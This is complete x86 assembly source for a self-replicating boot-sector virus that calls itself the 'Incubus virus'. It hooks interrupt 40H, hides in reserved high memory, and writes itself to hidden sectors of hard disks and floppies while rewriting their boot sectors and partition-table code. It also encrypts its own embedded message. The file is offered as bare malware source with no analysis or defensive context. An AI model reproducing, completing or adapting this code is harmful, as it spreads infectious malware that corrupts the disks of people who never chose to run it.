

CSEG SEGMENT
     ASSUME CS:CSEG, ES:CSEG, SS:CSEG
     ORG 0H

Incubus PROC FAR
Start:  DB 0EAH                 ;JMP 07E0:Begin
        DW OFFSET Begin
        DW 07E0H

BytesRead:
        CLI
        XOR AX,AX
        MOV SS,AX
        MOV SP,7C00H
        PUSH SS
        POP ES
        MOV BX,7E00H
        MOV AX,0201H
        MOV CX,2706H
        MOV DX,0100H
        INT 13H
        JMP BX
BytesRead@:
BytesWrite:
        CLI
        XOR AX,AX
        MOV SS,AX
        MOV SP,7C00H
        PUSH SS
        POP ES
        MOV BX,7E00H
        MOV AX,0201H
BytesWriteComp:
BytesWriteCX:MOV CX,2706H
BytesWriteDX:MOV DX,0100H
        INT 13H
        JMP BX
BytesWrite@:

BytesJump       DW ?
Vector40        DD ?

Message:        DB 'Incubus virus - Little Loc',0

Encrypt:PUSHF
        PUSH AX
        PUSH DI
        PUSH SI
        MOV SI,OFFSET Message   
EncLoop:CLD
        CS:
        LODSB
        OR AL,AL
        JE EncEnd
        NOT AL
        CLD
        CS:
        STOSB
        JMP SHORT EncLoop
EncEnd: POP SI
        POP DI
        POP AX
        POPF
        RETN

Begin:  CALL Encrypt                               ;Decrypt Message
        PUSH ES
        POP DS
        MOV DI,7C3EH
        MOV SI,OFFSET BytesRead+7E00H
        MOV CX,OFFSET BytesRead@-OFFSET BytesRead
        CLD
        REP MOVSB                                  ;Restore original code
        MOV DI,7C00H
        MOV SI,OFFSET BytesJump+7E00H
        MOVSW                                      ;Restore 1st Word
        MOV DI,SI        
        MOV SI,40H*4H                            ;Hook Int 40H
        PUSH SI
        MOVSW                                   ;Save old int 40 vector
        MOVSW
        POP DI
        MOV AX,OFFSET Handle40                  ;Set vector to Handle40
        STOSW
        DEC WORD PTR DS:[413H]                  ;System memory - 1K
        INT 12H                                 ;Fetch amount of memory
        MOV CL,0AH
        ROR AX,CL                               ;Set to proper format
        STOSW                                   
        MOV ES,AX
        XOR DI,DI
        MOV SI,7E00H
        MOV CX,OFFSET Done-OFFSET Start
        REP MOVSB                               ;Copy me to high memory
        PUSH ES
        MOV AX,OFFSET HighCode
        PUSH AX
        RETF                                    ;Jump up there
HighCode:PUSH CS
        POP DS
        MOV AX,201H
        MOV BX,OFFSET DONE
        INC CX
        MOV DX,0080H
        INT 13H                                 ;Read Partition Table
        JB BootJump
        MOV CX,DS:[DONE+1BEH+6H]                ;Fetch sector-track info
        AND CX,0000000000111111B                ;Get sector values only
        MOV WORD PTR DS:[BytesWriteCX+1H],CX        
        MOV WORD PTR DS:[BytesWriteDX+1H],DX
        CALL CompareAndExchange
        JB BootJump
        MOV AX,301H
        XOR BX,BX
        PUSH AX
        CALL Encrypt
        INT 13H               ;Write me to Last sector of first track
        CALL Encrypt
        POP AX
        JB BootJump
        MOV BX,OFFSET DONE
        MOV CL,1H
        INT 13H               ;Write Partition table to disk
BootJump:DB 0EAH        ;JMP 0000:7C00
         DW 7C00H
         DW 0000H

CompareAndExchange:
        PUSH CX
        MOV SI,OFFSET DONE+3EH
        MOV DI,OFFSET BytesWrite
        MOV CX,OFFSET BytesWriteComp-Offset BytesWrite
        PUSH SI
        CLD
        REP CMPSB
        POP SI
        JE CompareAndExchangeNot
        MOV AX,DS:[Done]
        MOV WORD PTR DS:[BytesJump],AX
        MOV DI,OFFSET BytesRead                
        MOV CX,OFFSET BytesRead@-OFFSET BytesRead
        PUSH SI
        PUSH CX
        CLD
        REP MOVSB
        POP CX
        POP DI
        MOV SI,OFFSET BytesWrite
        CLD
        REP MOVSB
        MOV WORD PTR DS:[Done],3CEBH
        POP CX
        CLC
        RETN
CompareAndExchangeNot:
        POP CX
        STC
        RETN

Handle40:PUSH CX
        PUSH DX
        PUSH DI
        PUSH SI
        PUSH DS
        PUSH BX
        PUSH ES
        CMP CX,0001H
        JNE JumpVector
        CMP AX,201H
        JNE JumpVector
        OR DH,DH
        JE Infect
JumpVector:
        POP ES
        POP BX
        POP DS
        POP SI
        POP DI
        POP DX
        POP CX
        JMP CS:[Vector40]
CallVector:
        PUSHF
        CALL CS:[Vector40]
        RETN
Return: POPF
        POP AX
        POP ES
        POP BX
        POP DS
        POP SI
        POP DI
        POP DX
        POP CX
        RETF 0002H
Infect: 
        PUSH ES
        PUSH BX
        PUSH CS
        POP DS
        PUSH CS
        POP ES
        MOV BX,OFFSET Done
        CALL CallVector            ;Read boot sector into memory
        POP DI
        POP ES
        PUSH AX
        PUSHF
        JB Return
        MOV SI,BX
        MOV CX,200H
        CLD
        REP MOVSB                  ;Copy it to buffer of calling program
        PUSH CS
        POP ES
        MOV SI,DX
        MOV DI,OFFSET Done
        MOV AX,DS:[DI+13H]         ;Total sectors
        XOR DX,DX
        MOV CX,DS:[DI+18H]         ;Sector per track
        JCXZ JumpReturn
        DIV CX                     ;Tracks per disk = Total Sec/Sec per Track
        OR DX,DX
        JNE JumpReturn
        MOV BX,DS:[DI+1AH]         ;Number of heads
        OR BX,BX
        JE JumpReturn
        DIV BX                     ;Divide by the number of heads
        OR DX,DX
        JNE JumpReturn
        DEC AL
        MOV CH,AL
        DEC BX                     ;Heads are zero based
        MOV DH,BL
        MOV WORD PTR DS:[BytesWriteCX+1H],CX     ;put values into Load code
        MOV WORD PTR DS:[BytesWriteDX+1H],DX
        MOV DX,SI                                ;Restore disk number
        MOV DH,BL                                ;set DH = Last Head
        CALL CompareAndExchange
        JB JumpReturn
        XOR BX,BX
        MOV AX,301H
        PUSH AX
        CALL Encrypt                             ;Encrypt Mesage
        CALL CallVector                          ;Write me to Last Sector
        CALL Encrypt                             ;Decrypt Message
        POP AX
        JB JumpReturn
        MOV BX,OFFSET Done
        XOR CX,CX
        INC CX
        MOV DH,CH
        CALL CallVector                          ;Write boot sector to disk
JumpReturn:JMP Return

Done:          
Incubus ENDP
CSEG ENDS
        END Start       
                        

